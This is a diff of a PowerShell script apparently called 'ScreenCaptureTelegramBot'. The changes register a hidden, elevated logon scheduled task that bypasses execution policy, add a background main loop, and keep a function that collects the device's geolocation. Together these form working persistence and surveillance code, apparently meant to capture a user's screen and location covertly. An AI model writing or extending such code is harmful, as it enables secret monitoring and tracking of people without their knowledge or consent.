@@ -9,27 +9,42 @@ if (-not $background) {
     $taskName = "ScreenCaptureTelegramBot"
     
     # Determine the full path of the script
-    if ($PSCommandPath) {
-        $scriptPath = $PSCommandPath
+    try {
+        $scriptPath = (Resolve-Path $MyInvocation.MyCommand.Definition).Path
     }
-    else {
-        $scriptPath = $MyInvocation.MyCommand.Definition
+    catch {
+        Write-Error "Unable to resolve script path. Exiting."
+        exit
     }
-
-    # Build the task command line (note the escaped quotes around the script path)
+    
+    # Build the task command line; the backticks escape the quotes around the script path.
     $taskCommand = "PowerShell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`" -background"
+    
+    Write-Output "Registering scheduled task '$taskName' with command:"
+    Write-Output $taskCommand
 
-    # Create the scheduled task using schtasks.exe; the task is set to run at logon with highest privileges
+    # Create the scheduled task using schtasks.exe; it runs at logon with highest privileges.
     $createTask = schtasks.exe /create /tn $taskName /tr $taskCommand /sc onlogon /rl HIGHEST /f
     if ($LASTEXITCODE -eq 0) {
         Write-Output "Scheduled task '$taskName' registered successfully."
         # Optionally, start the task immediately
-        schtasks.exe /run /tn $taskName
+        schtasks.exe /run /tn $taskName | Out-Null
     }
     else {
-        Write-Error "Failed to register scheduled task. Command output: $createTask"
+        Write-Error "Failed to register scheduled task. Output: $createTask"
     }
     exit
+}
+
+# -------------------------------
+# Background Mode: Main Functionality
+# -------------------------------
+
+Write-Output "Running in background mode. Starting main loop..."
+
+# Ensure temporary folder exists
+if (-not (Test-Path "C:\Temp")) {
+    New-Item -ItemType Directory -Path "C:\Temp" | Out-Null
 }
 
 # ===============================
@@ -228,9 +243,9 @@ function Get-WindowsGeolocation {
     }
 
     return @{
-        Latitude = $watcher.Position.Location.Latitude
+        Latitude  = $watcher.Position.Location.Latitude
         Longitude = $watcher.Position.Location.Longitude
-        Accuracy = $watcher.Position.Location.HorizontalAccuracy
+        Accuracy  = $watcher.Position.Location.HorizontalAccuracy
     }
 }
 
